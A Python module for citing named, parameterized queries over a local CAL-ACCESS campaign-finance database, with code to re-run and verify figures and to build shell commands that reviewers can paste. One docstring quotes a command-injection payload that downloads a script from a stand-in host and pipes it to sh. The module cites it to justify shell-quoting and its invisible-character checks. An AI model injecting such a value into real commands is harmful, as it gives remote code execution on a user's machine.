"""Verifiable citations to local datasets.

⌘F on a web page is the right verification for prose. It is the wrong one for a database: a
contribution total is not a string on a page, and forcing it to be one is what pushed
researchers onto third-party mirrors whose numbers we then had to trust.

So a claim can cite a *query* instead. The source records which named query, with which
parameters, and what it returned; verification re-runs it and compares. That is stronger than
a snippet — it is reproducible on demand, and a human can run the same one-liner the pipeline
ran rather than hunting for text.

Queries are **named and parameterized**, never free SQL from an agent: an agent that can
write arbitrary SQL can write a query that returns whatever its claim needs, which is the
same self-certification problem `verification` has elsewhere.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, NamedTuple

# Half a CENT, absolute. A 0.5% relative tolerance let a round figure verify against a true
# total more than $2,000 away. Half a cent absorbs float summation noise (~1e-9) and fails any
# figure a whole cent off — where "within one cent" would not: 100.02 - 100.01 is 0.00999… in
# binary floats.
TOLERANCE = 0.005

# Filers do not reliably split a candidate's name: one committee put the full name in the
# LAST-name field with the first name blank, so a (last, first) filter returned $0.00 for the
# largest independent expenditure in a race. Match every spelling a filer might use, and keep
# it exact per spelling so a different person with the same surname stays out.
def name_match_sql(last_col: str, first_col: str, first: str) -> str:
    """SQL matching a candidate name across the spellings filers actually use.

    With a first name given, a bare surname match is deliberately EXCLUDED: a race can have
    two candidates sharing a surname, so it cannot be attributed to either. The case that
    matters, the whole name in the last-name field, is caught by the concatenation clauses
    instead.
    """
    full = f"""
     OR UPPER(TRIM({last_col})) = UPPER(TRIM(?))
     OR UPPER(TRIM(COALESCE({first_col},'') || ' ' || COALESCE({last_col},''))) = UPPER(TRIM(?))
     OR UPPER(TRIM(COALESCE({last_col},'') || ' ' || COALESCE({first_col},''))) = UPPER(TRIM(?))
    """
    if first:
        return f"""(
        (UPPER(TRIM({last_col})) = UPPER(TRIM(?)) AND UPPER(TRIM(COALESCE({first_col},'')))
             = UPPER(TRIM(?))){full})"""
    return f"""(UPPER(TRIM({last_col})) = UPPER(TRIM(?)){full})"""


def name_args(last: str, first: str) -> list[str]:
    """Args for `name_match_sql`, in the same order."""
    full = f"{first} {last}".strip()
    head = [last.strip(), first.strip()] if first else [last.strip()]
    return head + [full, full, full]


def iso_date_sql(col: str) -> str:
    """SQL turning the export's "M/D/YYYY 12:00:00 AM" date text into YYYY-MM-DD.

    Compared as text, 5/24/2026 sorts before 10/14/2014, so every date filter goes through
    this. A value with no slash (already ISO, or blank) passes through minus any time part,
    and NULL reads as blank.
    """
    d = f"TRIM(COALESCE({col}, ''))"
    day = f"SUBSTR({d}, 1, INSTR({d} || ' ', ' ') - 1)"   # "10/14/2025"
    rest = f"SUBSTR({day}, INSTR({day}, '/') + 1)"         # "14/2025"
    return (f"(CASE WHEN INSTR({day}, '/') = 0 THEN {day} ELSE"
            f" SUBSTR({rest}, INSTR({rest}, '/') + 1)"
            f" || '-' || SUBSTR('0' || SUBSTR({day}, 1, INSTR({day}, '/') - 1), -2)"
            f" || '-' || SUBSTR('0' || SUBSTR({rest}, 1, INSTR({rest}, '/') - 1), -2) END)")


def real_date_sql(iso_col: str) -> str:
    """SQL true when an `iso_date_sql()` value is a real calendar date.

    Not its shape: a day-first "14/10/2025" normalizes to "2025-14-10", which looks like a
    date and sorts like one, so a window would place it silently. SQLite's date() rolls an
    impossible day over ("2025-02-31" -> "2025-03-03") and returns NULL for no date at all, so
    only a real date comes back unchanged. `IS`, not `=`, so a blank reads false, not NULL.
    """
    return f"(date({iso_col}) IS {iso_col})"


def date_window_sql(iso_col: str, since: str, until: str) -> tuple[str, list[str]]:
    """SQL keeping an ISO date (`iso_date_sql()` output) inside [since, until], and its args.

    Each bound compares at its own precision: an ISO date sorts after its own prefix, and
    `until` is checked against the date cut to its length, so until="2025" runs through
    12/31/2025. ie_total once cut both bounds to YYYY-MM for a BETWEEN, which made
    until="2025" exclude all of 2025 and widened since="2026-05-24" to the whole of May.
    Refuses a bound that is not a real ISO date (`calaccess.check_date`).

    Returns ("", []) with no bounds. A date that is not a real one (`real_date_sql()`) is
    neither in nor out here: whether to keep it is the caller's call, and it must say which.
    """
    from . import calaccess

    since = calaccess.check_date(since, "since")
    until = calaccess.check_date(until, "until")
    if since and until and since[:len(until)] > until:
        # No date can satisfy it, so it would come back as a well-formed "no expenditures in
        # this window" -- a finding, made out of a typo.
        raise ValueError(f"since {since!r} is after until {until!r}")
    terms, args = [], []
    if since:
        terms.append(f"{iso_col} >= ?")
        args.append(since)
    if until:
        terms.append(f"SUBSTR({iso_col}, 1, LENGTH(?)) <= ?")
        args += [until, until]
    return " AND ".join(terms), args


# A single contribution is reported on BOTH Form 460 Schedule A and Form 496 Part 3 when it
# crosses the 24-hour threshold, as two genuinely different filings — so amendment dedup does
# not catch it, and a large donor's gift came out doubled. The filer links the pair
# explicitly: TRAN_IDs share a base after the form prefix (A-100001 / F496P3-100001).
# Collapse on that base plus contributor, amount and date, within one filer.
DEDUPED_RECEIPTS = """
    SELECT MAX(x.AMOUNT) AS AMOUNT, x.CTRIB_NAML, x.CTRIB_NAMF, x.RCPT_DATE,
           -- The group's provenance. A collapsed row still has to name a filing a human can
           -- open, or the listing loses its exit to a citation and every figure taken from it
           -- becomes uncitable. The EARLIEST filing is the one the gift was first reported on.
           MIN(CAST(x.FILING_ID AS INTEGER)) AS FILING_ID,
           COUNT(DISTINCT x.FILING_ID) AS FILINGS,
           MAX(x.CTRIB_EMP) AS CTRIB_EMP, MAX(x.CTRIB_OCC) AS CTRIB_OCC,
           MAX(x.FORM_TYPE) AS FORM_TYPE
    FROM (SELECT r.*, CASE WHEN INSTR(r.TRAN_ID, '-') > 0
                           THEN SUBSTR(r.TRAN_ID, INSTR(r.TRAN_ID, '-') + 1)
                           ELSE r.TRAN_ID END AS tbase
          FROM RCPT_LATEST r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
          WHERE f.FILER_ID = ?{extra}) x
    GROUP BY x.tbase, UPPER(TRIM(x.CTRIB_NAML)), UPPER(TRIM(COALESCE(x.CTRIB_NAMF,''))),
             x.RCPT_DATE, CAST(x.AMOUNT AS REAL)
"""


def _no_rows(detail: str, suggestions: list[str] | None = None) -> "QueryResult":
    """No matching rows is NEVER a zero.

    `SUM()` over an empty set coalesces to 0.0, and a zero reads as a finding: "no committee
    has spent against this candidate" is a publishable sentence and was, briefly, wrong by
    the largest expenditure in a race. Every query returns this instead.
    """
    return QueryResult(value=None, rows=0, found=False, detail=detail,
                       suggestions=suggestions or [])


@dataclass
class QueryResult:
    value: Any
    detail: str = ""
    rows: int = 0
    found: bool = True
    suggestions: list[str] | None = None
    # Set by `run()`, never by a query: which definition produced the value, and from which
    # export (see `Query.version` and `export_date()`).
    version: int = 0
    export_date: str = ""

    @property
    def note(self) -> str:
        n = self.detail
        if not self.found and self.suggestions:
            n += " — NO MATCH. Did you mean: " + "; ".join(self.suggestions[:4])
        elif not self.found:
            n += " — NO MATCH for that name"
        return n


def _other_schedules(con: Any, filer_id: str, form_type: str, who: str = "",
                     who_args: list[Any] | None = None) -> list[str]:
    """The receipt schedules besides `form_type` that hold this filer's receipts (narrowed by
    `who`, a condition on `r`), for a miss to suggest. Empty when `form_type` is "", which
    already counted every schedule.

    Suggestions only: nothing here reaches a value, which is why the definition fingerprint
    leaves it out. Read from the raw schedules, not DEDUPED_RECEIPTS, whose collapsed
    cross-form group carries only one of its schedules (A-100001 and F496P3-100001 read as
    F496P3). A blank schedule is left out: no form_type selects it alone, and "form_type="
    would count every schedule.
    """
    if not form_type:
        return []
    return [r[0] for r in con.execute(f"""
        SELECT DISTINCT UPPER(TRIM(r.FORM_TYPE)) FROM RCPT_LATEST r
        JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
        WHERE f.FILER_ID = ?{who}
          AND UPPER(TRIM(COALESCE(r.FORM_TYPE, ''))) NOT IN ('', UPPER(TRIM(?)))
        ORDER BY 1
    """, [str(filer_id), *(who_args or []), form_type])]


def _contributor_total(root: Path, *, filer_id: str, contributor: str,
                       contributor_first: str = "", form_type: str = "A") -> QueryResult:
    """Total itemized contributions from one contributor to one filer.

    For an INDIVIDUAL pass `contributor_first` too: CTRIB_NAML holds only the surname, so a
    common surname alone summed unrelated donors into one six-figure contributor who does not
    exist. Organizations keep their whole name in CTRIB_NAML, so they need only `contributor`.

    `form_type` defaults to A (monetary contributions received), as `filer_total` does. The
    receipts table holds every receipt schedule, so without it an in-kind item (C) was summed
    as a gift, and a vendor's refund or a bank's interest (I) made a business that gave nothing
    a contributor. Pass another schedule to count that one, or "" for every schedule.
    """
    from . import calaccess

    if form_type != form_type.strip():
        # " " is truthy, so it filtered to the rows with no schedule at all, under a label
        # naming none.
        raise ValueError(f"form_type must be a schedule code, or '' for every schedule, "
                         f"not {form_type!r}")
    con = calaccess.connect(root)
    who = " AND UPPER(TRIM(r.CTRIB_NAML)) = UPPER(TRIM(?))"
    who_args: list[Any] = [contributor]
    if contributor_first:
        who += " AND UPPER(TRIM(COALESCE(r.CTRIB_NAMF,''))) = UPPER(TRIM(?))"
        who_args.append(contributor_first)
    schedule = " AND UPPER(TRIM(r.FORM_TYPE)) = UPPER(TRIM(?))" if form_type else ""
    schedule_args = [form_type] if form_type else []
    label = f"schedule-{form_type}" if form_type else "every-schedule"
    args: list[Any] = [str(filer_id)] + who_args + schedule_args
    inner = DEDUPED_RECEIPTS.format(extra=who + schedule)
    row = con.execute(f"SELECT SUM(CAST(d.AMOUNT AS REAL)) amt, COUNT(*) n FROM ({inner}) d",
                      args).fetchone()
    n = int(row["n"] or 0)
    if n == 0:
        # A zero here is ambiguous and dangerous: it reads as "this donor gave nothing" when
        # it usually means the name was typed slightly differently ("… PAC" vs "… PAC SCC").
        # Never let a miss masquerade as a finding. Names come from the schedule searched: a
        # near-match on another one is a receipt, not the contributor that was meant.
        near = [" ".join(x for x in (r["nf"], r["nm"]) if x) for r in con.execute(f"""
            SELECT DISTINCT r.CTRIB_NAML nm, r.CTRIB_NAMF nf FROM RCPT_LATEST r
            JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
            WHERE f.FILER_ID = ? AND UPPER(r.CTRIB_NAML) LIKE UPPER(?){schedule}
            LIMIT 6
        """, [str(filer_id), f"%{contributor.split()[0]}%" if contributor.split() else "%"]
             + schedule_args)]
        detail = f"0 itemized {label} gift(s)"
        # The name matched, on a schedule this did not count: say where, rather than leave
        # "no match" to send the researcher off retyping a name that was right.
        if others := _other_schedules(con, filer_id, form_type, who, who_args):
            detail += f"; receipts on schedule {', '.join(others)} not counted"
            near = ["form_type=" + ", form_type=".join(others)] + near
        con.close()
        return QueryResult(value=None, rows=0, found=False, suggestions=near, detail=detail)

    detail = f"{n} itemized {label} gift(s)"
    if not contributor_first:
        people = con.execute(f"""
            SELECT COUNT(DISTINCT UPPER(TRIM(COALESCE(d.CTRIB_NAMF,'')))) c FROM ({inner}) d
        """, args).fetchone()["c"]
        if people and people > 1:
            # Summing several people under one surname is how a nonexistent contributor
            # appeared.
            detail += (f" across {people} DIFFERENT first names — this is not one contributor;"
                       " pass contributor_first")
            con.close()
            return QueryResult(value=None, rows=n, found=False, detail=detail)
    con.close()
    return QueryResult(value=float(row["amt"] or 0), rows=n, detail=detail)


def _filer_total(root: Path, *, filer_id: str, form_type: str = "A") -> QueryResult:
    """Total itemized contributions received by a filer.

    `form_type` defaults to A (monetary contributions received). Without it the total mixed
    schedules A, C and I and came out hundreds of thousands of dollars high: a plausible-looking
    number answering a question nobody asked.
    """
    from . import calaccess

    con = calaccess.connect(root)
    extra = " AND UPPER(TRIM(r.FORM_TYPE)) = UPPER(TRIM(?))" if form_type else ""
    inner = DEDUPED_RECEIPTS.format(extra=extra)
    args: list[Any] = [str(filer_id)] + ([form_type] if form_type else [])
    row = con.execute(
        f"SELECT SUM(CAST(d.AMOUNT AS REAL)) amt, COUNT(*) n FROM ({inner}) d", args).fetchone()
    con.close()
    n = int(row["n"] or 0)
    if n == 0:
        return _no_rows(f"no schedule-{form_type} contributions for filer {filer_id}")
    return QueryResult(value=float(row["amt"] or 0), rows=n,
                       detail=f"{n} itemized schedule-{form_type} gift(s)")


def _top_contributor(root: Path, *, filer_id: str, form_type: str = "A") -> QueryResult:
    """The single largest contributor to a filer, by itemized total.

    Grouped by last AND first name: CTRIB_NAML is the surname for individuals, so grouping on
    it alone merged every unrelated donor sharing one, reporting a top contributor who does not
    exist.

    `form_type` defaults to A (monetary contributions received), as `filer_total` does. Ranked
    over every receipt schedule, a vendor's refund or a bank's interest (I) could name a
    business that gave nothing "the largest contributor", and an in-kind item (C) could decide
    between two donors. Pass another schedule to rank by that one, or "" for every schedule.
    """
    from . import calaccess

    if form_type != form_type.strip():
        raise ValueError(f"form_type must be a schedule code, or '' for every schedule, "
                         f"not {form_type!r}")
    con = calaccess.connect(root)
    schedule = " AND UPPER(TRIM(r.FORM_TYPE)) = UPPER(TRIM(?))" if form_type else ""
    label = f"schedule-{form_type}" if form_type else "every-schedule"
    inner = DEDUPED_RECEIPTS.format(extra=schedule)
    rows = con.execute(f"""
        SELECT d.CTRIB_NAML nm, d.CTRIB_NAMF nf, SUM(CAST(d.AMOUNT AS REAL)) amt,
               COUNT(*) n
        FROM ({inner}) d
        GROUP BY UPPER(TRIM(d.CTRIB_NAML)), UPPER(TRIM(COALESCE(d.CTRIB_NAMF,'')))
        ORDER BY amt DESC LIMIT 4
    """, [str(filer_id)] + ([form_type] if form_type else [])).fetchall()
    row = rows[0] if rows else None
    if row is None:
        # A slate mailer's receipts are all on Form 401: "no schedule-A contributions" alone
        # read as a committee that received nothing.
        others = _other_schedules(con, filer_id, form_type)
        con.close()
        return _no_rows(f"no {label} contributions found for filer {filer_id}"
                        + (f"; receipts on schedule {', '.join(others)} not counted"
                           if others else ""),
                        ["form_type=" + ", form_type=".join(others)] if others else None)
    con.close()
    top = float(row["amt"] or 0)
    tied = [r for r in rows if abs(float(r["amt"] or 0) - top) < TOLERANCE]
    names = [" ".join(x for x in (r["nf"], r["nm"]) if x).strip() for r in tied]
    if len(tied) > 1:
        # ORDER BY ... LIMIT 1 makes an arbitrary pick among equals, and a verifier rightly
        # rejected a "largest contributor" that was really a two-way tie. Return the tie.
        return QueryResult(value=" | ".join(sorted(names)), rows=len(tied),
                           detail=f"{len(tied)}-WAY TIE at ${top:,.0f} in {label} gifts — not "
                                  "a single largest contributor; do not word this as one")
    return QueryResult(value=names[0], rows=int(row["n"] or 0),
                       detail=f"${top:,.0f} across {row['n']} {label} gift(s)")


def _ie_total(root: Path, *, candidate_last: str, first: str = "", stance: str = "",
              since: str = "", until: str = "") -> QueryResult:
    """Total late independent expenditures naming a candidate.

    `since`/`until` are ISO dates (YYYY, YYYY-MM or YYYY-MM-DD) bounding the expenditure
    date, inclusive at their own precision: until="2025" runs through 12/31/2025. Without them
    2006 and 2026 are summed together, which cannot answer a question about either race: a
    candidate's unfiltered support figure can be dominated by a campaign for another office
    years earlier.
    """
    from . import calaccess

    # Refused, not used: "10/14/2025" compared against normalized dates filters by string
    # order, and a total from the wrong window still matches its own recorded `expected`.
    window, window_args = date_window_sql("d", since, until)
    if not first.strip():
        # Asked for a surname alone this returned 22x the real figure: most of it belonged to a
        # different candidate with the same surname, in another county and year. A surname
        # is not a candidate, and there is no page or snippet downstream to catch it.
        raise ValueError(
            "ie_total needs `first`: a surname alone mixes candidates (in testing it returned "
            "22x the real figure, mostly a different person). Pass the first name.")

    con = calaccess.connect(root)
    if not calaccess.covers_by_amendment(con):
        # A total that renders green is a finding. Here that total can include money a later
        # amendment gave to another candidate, so refuse rather than let it reproduce.
        con.close()
        raise calaccess.DegradedDatabase(calaccess.COVER_FALLBACK)
    match = name_match_sql("c.CAND_NAML", "c.CAND_NAMF", first)
    args: list[Any] = name_args(candidate_last, first)
    if stance:
        match += " AND UPPER(c.SUP_OPP_CD) = UPPER(?)"
        args.append(stance[:1])
    # EXP_DATE is "M/D/YYYY 12:00:00 AM" text, so a string comparison would sort 5/24/2026
    # before 10/14/2014: window the normalized date instead. A row whose date did not
    # normalize cannot be placed inside a window, so it stays out of one, as it always has --
    # but it is counted, and the detail says so, rather than dropped without a word. The real
    # export has 31 such rows, all with a blank amount.
    dated = real_date_sql("d") if window else "1"   # with no window, d is never computed
    inside = f"({dated} AND {window})" if window else "1"
    # A blank AMOUNT is money nobody stated, not $0: CAST made it 0.0 and COUNT(*) still counted
    # it, so a window holding only such a row came back found, "$0.00, 1 expenditure(s)" --
    # the zero this module exists to refuse. So only a plain decimal is read as money; anything
    # else is NULL here, left out of the sum AND the count, and named in the detail. Not just
    # blanks: CAST reads "N/A" as 0.0 and "1,000" as 1.0, figures nobody filed. The real export
    # has 33 blanks and nothing else unreadable. A stated "0" is the filer's figure and counts.
    a = "TRIM(COALESCE(s.AMOUNT, ''))"
    unsigned = f"(CASE WHEN SUBSTR({a}, 1, 1) = '-' THEN SUBSTR({a}, 2) ELSE {a} END)"
    amount = (f"(CASE WHEN {unsigned} GLOB '*[0-9]*' AND {unsigned} NOT GLOB '*[^0-9.]*'"
              f" AND {unsigned} NOT GLOB '*.*.*' THEN CAST({a} AS REAL) END)")
    row = con.execute(f"""
        SELECT SUM(CASE WHEN inside THEN amt END) amt, SUM(inside AND amt IS NOT NULL) n,
               SUM(inside AND amt IS NULL) unread_n,
               SUM(NOT dated) undated_n, SUM(CASE WHEN NOT dated THEN amt END) undated_amt
        FROM (SELECT amt, {dated} AS dated, {inside} AS inside
              FROM (SELECT {amount} amt, {iso_date_sql("s.EXP_DATE")} d
                    FROM S496_LATEST s JOIN CVR_LATEST c ON c.FILING_ID = s.FILING_ID
                    WHERE {match}))
    """, window_args + args).fetchone()
    n = int(row["n"] or 0)
    span = f"{since or '...'}..{until or '...'}"
    left_out = ""
    if row["unread_n"]:
        left_out += f"; {row['unread_n']} more with no readable amount, not counted"
    if window and row["undated_n"]:
        # an unreadable AMOUNT has no money to report; say nothing rather than "$0.00"
        undated_amt = float(row["undated_amt"] or 0)
        left_out += (f"; {row['undated_n']} more with no readable date, not counted"
                     + (f" (${undated_amt:,.2f} between them)" if undated_amt else ""))
    if n == 0:
        # The failure this guard exists for: a committee filed the candidate's whole name in
        # the last-name field, so a (last, first) filter found nothing and SUM() returned 0.0:
        # a confident "nobody spent against them", wrong by the largest expenditure in the race.
        near = [f"{r['nl']!r}/{r['nf']!r} {r['so']} "
                + (f"${float(r['amt']):,.0f}" if r["amt"] is not None else "no readable amount")
                for r in con.execute(f"""
            SELECT c.CAND_NAML nl, c.CAND_NAMF nf, c.SUP_OPP_CD so, SUM({amount}) amt
            FROM S496_LATEST s JOIN CVR_LATEST c ON c.FILING_ID = s.FILING_ID
            WHERE UPPER(c.CAND_NAML) LIKE UPPER(?) OR UPPER(c.CAND_NAMF) LIKE UPPER(?)
            GROUP BY UPPER(TRIM(c.CAND_NAML)), UPPER(TRIM(c.CAND_NAMF)), c.SUP_OPP_CD
            ORDER BY amt DESC LIMIT 6
        """, (f"%{candidate_last.strip()}%", f"%{candidate_last.strip()}%"))]
        con.close()
        # "counted": with rows left out, there were expenditures -- just none this can sum
        return _no_rows(f"no {stance or 'any'}-stance expenditures"
                        + (" counted" if left_out else "")
                        + (f" in {span}" if window else "") + left_out, near)
    con.close()
    return QueryResult(value=float(row["amt"] or 0), rows=n,
                       detail=f"{n} expenditure(s)"
                              + (f", {span}{left_out}" if window else
                                 f"{left_out} — NO DATE FILTER, may span multiple races"))


class Query(NamedTuple):
    fn: Callable[..., QueryResult]
    required: tuple[str, ...]
    description: str
    # Which definition this is. A verdict on a query citation was formed about one calculation,
    # and the sid (name + params + expected) does not cover the calculation — so a definition
    # that changed but happened to return the same number would keep a verdict about the old
    # one. Every name here has already returned different numbers after a fix (amendment,
    # cover-record and cross-form dedup; the first-name requirement). A verdict recorded under
    # another version is stale (`judgments.is_stale()`), and `vg verify` says which.
    #
    # BUMP IT when a change can alter what the query returns for ANY input the previous
    # version accepted, even if every recorded figure still reproduces: dedup, name matching,
    # what a parameter or a date bound means, a newly required parameter, refusing an input
    # that used to return a value. The recorded figures reproducing is not the test — the
    # verifier judged the calculation, not only its output.
    # DON'T bump for what cannot change a value: wording of `detail` or an error, near-match
    # suggestions, speed, a new optional parameter whose default keeps the old behaviour.
    # When unsure, bump: the cost is re-judging this query's verdicts once; the cost of not
    # bumping is a verdict vouching for a calculation nobody checked.
    #
    # A comment is not a gate. `test_a_query_definition_cannot_change_unnoticed` pins each
    # query's (version, fingerprint of its code and of every shared helper and dedup view it
    # runs through) and fails on any change, so the decision above is made on purpose, in the
    # diff a reviewer reads, rather than skipped.
    version: int


REGISTRY: dict[str, Query] = {
    # v2 of contributor_total and top_contributor: schedule A only by default, as filer_total
    # already was. v1 summed every receipt schedule, refunds and interest included.
    "calaccess.contributor_total": Query(
        _contributor_total, ("filer_id", "contributor"),
        "contributions from one contributor (add contributor_first for an individual; "
        "schedule A unless form_type says otherwise)", 2),
    "calaccess.filer_total": Query(
        _filer_total, ("filer_id",),
        "total itemized contributions received by a filer", 1),
    "calaccess.top_contributor": Query(
        _top_contributor, ("filer_id",),
        "the largest contributor to a filer, by itemized total (schedule A unless form_type "
        "says otherwise)", 2),
    "calaccess.ie_total": Query(
        _ie_total, ("candidate_last", "first"),
        "late independent expenditures naming a candidate; pass stance and since/until", 2),
}


def dataset(name: str) -> str:
    """The dataset a query named `name` reads, by the namespace of its name ("" for none)."""
    return {"calaccess": "CAL-ACCESS"}.get(name.split(".", 1)[0], "")


def describe_export(export_date: str, data: str = "CAL-ACCESS") -> str:
    """How every message names the export a figure came from — `vg query`, `vg judge`,
    `vg judgments` and the review page — so a reviewer comparing them reads one phrasing."""
    if export_date:
        return f"the {data} export of {export_date}"
    return (f"an undated {data} database (built before exports were dated; rebuild it with "
            f"`vg calaccess build`)")


def export_date(name: str, root: Path) -> str:
    """The date of the export a query named `name` reads under `root`, or "" if unknown."""
    if dataset(name) != "CAL-ACCESS":
        return ""
    from . import calaccess

    return calaccess.export_info(root).get("export_date", "")


# Unicode's whole Default_Ignorable_Code_Point set (DerivedCoreProperties.txt), not a sample:
# code points that render as nothing. str.isprintable() already rejects the Cf/Cn ones (bidi
# overrides, zero-width), but the letters and marks among them pass it — U+3164 HANGUL
# FILLER, U+034F COMBINING GRAPHEME JOINER, the variation selectors. Plus U+2800 BRAILLE
# PATTERN BLANK, which is not "ignorable" but renders as nothing all the same.
_INVISIBLE = re.compile(
    r"[­͏؜ᅟᅠ឴឵᠋-᠏​-‏‪-‮"
    r"⁠-⁯⠀ㅤ︀-️﻿ﾠ￰-￸"
    r"\U0001bca0-\U0001bca3\U0001d173-\U0001d17a\U000e0000-\U000e0fff]")
_QUERY_NAME = re.compile(r"[A-Za-z0-9_]+(?:\.[A-Za-z0-9_]+)*")
_PARAM_KEY = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")


def unprintable(text: str) -> bool:
    """Whether `text` holds a character a pasted command cannot carry as displayed: a control
    character, or one that renders as nothing (`_INVISIBLE`, or anything str.isprintable()
    rejects). The one rule for every value printed into `human_command()`."""
    return not text.isprintable() or bool(_INVISIBLE.search(text))


def unsafe_reason(name: str, params: dict[str, str]) -> str | None:
    """Why this query cannot be printed as a command a reviewer can safely paste, or None.

    The name, keys and values are agent-authored, and `human_command` hands them to a human's
    shell. Quoting makes any printable text inert; it cannot help with the rest:
    - a control character acts on the terminal before the shell parses a quote (^C abandons
      the line; an embedded end-of-bracketed-paste turns what follows into keystrokes);
    - a name starting with `-` is read by `vg query` as an option, quoted or not;
    - a key holding `=` is split differently by `vg query` than it was by verification;
    - an invisible character (`_INVISIBLE`, or anything str.isprintable() rejects) makes the
      command on screen differ from the one copied.
    The messages never echo the text. The cost, measured: 84 of ~1.2M distinct contributor
    names in the CAL-ACCESS export carry control bytes (stray \\x02/\\x0b/\\x12, and C1 bytes
    from double-encoded accents), and those contributors cannot be cited by query. Cite the
    filing page instead. No candidate name or filer id in the export is affected.
    """
    if not _QUERY_NAME.fullmatch(str(name)):
        return "query name must be a dotted registry name (letters, digits, _ and .)"
    for k, v in params.items():
        if not _PARAM_KEY.fullmatch(str(k)):
            return "query parameter names must be identifiers (letters, digits and _)"
        if unprintable(str(v)):
            return f"query parameter {k} contains a control or invisible character"
    return None


def run(name: str, params: dict[str, str], root: Path) -> QueryResult:
    # Unknown names first, so a typo gets the list of real ones rather than a charset rule.
    if name not in REGISTRY:
        raise ValueError(f"unknown query {name!r}; known: {', '.join(sorted(REGISTRY))}")
    # QueryCitation already refuses these at load. Checked again at the one door verify,
    # revalidation and the CLI all use, because a citation the reviewer cannot re-run must not
    # be green even where the query would ignore the character (`stance` keeps only its first).
    if reason := unsafe_reason(name, params):
        raise ValueError(reason)
    query = REGISTRY[name]
    missing = [p for p in query.required if not params.get(p)]
    if missing:
        raise ValueError(f"{name} needs {', '.join(missing)}")
    result = query.fn(root, **params)
    result.version = query.version
    result.export_date = export_date(name, root)
    return result


def matches(expected: Any, got: Any) -> bool:
    """Compare a recorded result to a fresh one.

    A None on either side matches only None: a miss is never a zero (see `_no_rows`).
    The query's return TYPE picks the comparison, so a new query must choose it deliberately:
    - an `int` is a count and compares exactly: '12.004' is not a count of 12;
    - a `float` is a dollar figure and must agree to the cent (TOLERANCE). Every numeric query
      today returns one. A count returned as `float(n)` would get the cent tolerance, and a
      ratio would need a comparison of its own;
    - anything else (a contributor's name) compares as trimmed, case-folded text.
    """
    if got is None or expected is None:
        return got == expected
    # Dispatch on what the query returned BEFORE parsing `expected`: a text result that looks
    # numeric ("100.00") must compare as text, or it would get the dollar tolerance.
    if isinstance(got, bool) or not isinstance(got, (int, float)):
        return str(expected).strip().casefold() == str(got).strip().casefold()
    try:
        e = float(str(expected).replace(",", "").lstrip("$"))
    except ValueError:
        return False
    if isinstance(got, int):
        return e == got
    return abs(e - got) < TOLERANCE


def human_command(name: str, params: dict[str, str], cache_root: str | None = None) -> str:
    """The command a reviewer copies and runs to check this themselves.

    `cache_root` is the root the figure was checked against (`QueryRun.cache_root`). Pass it
    whenever it is known: without `--cache`, `vg query` resolves its own root from `--data`,
    so a figure verified with `vg verify --cache X` printed a command reading a different
    database, or none — a green row its own command could not reproduce.

    The review page hands this string to a human to paste into a shell, and the name, keys
    and values are all agent-authored — so each is `shlex.quote`d as data. Quoting only values
    containing a space, and with repr, let `$(curl${IFS}-s${IFS}evil.sh|sh)` through bare:
    code execution on the reviewer's machine, delivered by the verification step.

    shlex.quote targets POSIX shells (sh, bash, zsh). fish reads `\\'` inside single quotes as
    an escaped quote, so a value ending in a backslash would unbalance its quoting; the review
    page says which shells the command is for.

    What quoting cannot neutralize (`unsafe_reason`) gets no command at all: "", which the
    review page renders as nothing to copy. QueryCitation refuses such a query at load, so
    this is the backstop for one built without validation.
    """
    if unsafe_reason(name, params):
        return ""
    cache = ""
    if cache_root:
        root = str(cache_root)
        if unprintable(root):
            # QueryRun refuses this at load; this is the backstop for one assigned after
            # validation. Same rule as a parameter: nothing to copy, not a command unlike its
            # display.
            return ""
        # A relative root starting with '-' would read as an option.
        cache = f" --cache {shlex.quote(root if not root.startswith('-') else './' + root)}"
    args = "".join(f" --param {shlex.quote(str(k))}={shlex.quote(str(v))}"
                   for k, v in params.items())
    return f"uv run vg query {shlex.quote(name)}{cache}{args}"
